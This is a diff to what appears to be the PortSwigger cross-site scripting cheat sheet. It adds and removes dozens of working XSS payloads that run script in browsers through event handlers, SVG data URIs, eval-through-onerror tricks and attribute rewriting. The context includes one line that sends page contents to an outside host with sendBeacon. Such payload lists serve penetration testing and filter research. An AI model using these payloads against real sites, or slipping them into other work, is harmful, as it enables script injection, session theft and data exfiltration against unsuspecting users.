@@ -46,6 +46,13 @@
 <object data=\"#!\nalert(1)\" codebase=javascript:>
 <embed src=\"#\nalert(1)\" codebase=javascript://>
 <embed src=\"#!\nalert(1)\" codebase=javascript:>
+<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>
+<svg onload=\"throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}\">
+<body onload=\"throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}\">
+<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>
+<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />
+<x onbeforescriptexecute=alert(1)><script>1</script>
+<x onafterscriptexecute=alert(1)><script>1</script>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -114,8 +121,6 @@
 <body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
 <* onmousewheel=alert(1) style=display:block>requires scrolling
 <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
-<* onbeforescriptexecute=alert(1)><script>1</script>
-<* onafterscriptexecute=alert(1)><script>1</script>
 <video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
 <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
 <body onafterprint=alert(1)>
@@ -1040,14 +1045,12 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>
 <script src=\"data:text/javascript,alert(1)\"></script>
 <svg><script href=\"data:text/javascript,alert(1)\" />
-<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>
 <script>import('data:text/javascript,alert(1)')</script>
 <math><x href=\"javascript:alert(1)\">blah
 <form><button formaction=javascript:alert(1)>XSS
 <form><input type=submit formaction=javascript:alert(1) value=XSS>
 <form action=javascript:alert(1)><input type=submit value=XSS>
 <svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>
-<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />
 <embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
 <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
@@ -1086,9 +1089,6 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>throw onerror=eval,'/*'+location</script>
 <svg onload=\"throw top.onerror=eval,'/*'+URL\">
 <body onload=\"throw onerror=eval,'/*'+location\">
-<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>
-<svg onload=\"throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}\">
-<body onload=\"throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}\">
 <script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\\x281\\x29'</script>
 <script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>
 <script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>
@@ -1107,6 +1107,16 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>onerror=eval,new name</script>
 <script>throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x</script>
 <script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\\x281\\x29',x</script>
+<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>
+<svg onload=\"attributes[0].value=name,new onload\">
+<svg onload=\"attributes[0].value=id+URL+id,new onload\" id=`>
+<input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>
+<input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>
+<input onclick=attributes[0].value='`'+URL+'`'>
+<form><input onclick=\"formAction=top.name,type='submit',new submit\">
+<svg onload=innerHTML=URL,innerHTML=textContent>
+<img/src/onerror=innerHTML=URL,innerHTML=textContent>
+<svg onload=innerHTML=URL,eval(textContent)>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
